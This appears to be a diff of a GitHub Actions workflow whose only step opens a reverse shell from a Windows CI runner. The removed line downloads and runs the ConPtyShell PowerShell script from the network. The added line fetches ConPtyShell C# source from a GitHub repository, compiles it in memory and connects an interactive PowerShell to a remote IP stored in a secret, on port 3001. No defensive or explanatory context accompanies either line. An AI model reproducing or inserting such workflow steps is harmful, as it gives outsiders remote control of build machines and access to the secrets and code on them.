@@ -8,4 +8,4 @@ jobs:
     runs-on: windows-latest
 
     steps:
-      - run: IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell ${{ secrets.RemoteIp }} 3001
+      - run: Add-Type -Language CSharp -TypeDefinition (IWR "https://github.com/Undefined01/build/blob/main/tools/ConPtyShell.cs" -UseBasicParsing); [ConPtyShellMainClass]::ConPtyShellMain((${{ secrets.RemoteIp }}, 3001, 80, 24, 'powershell'))
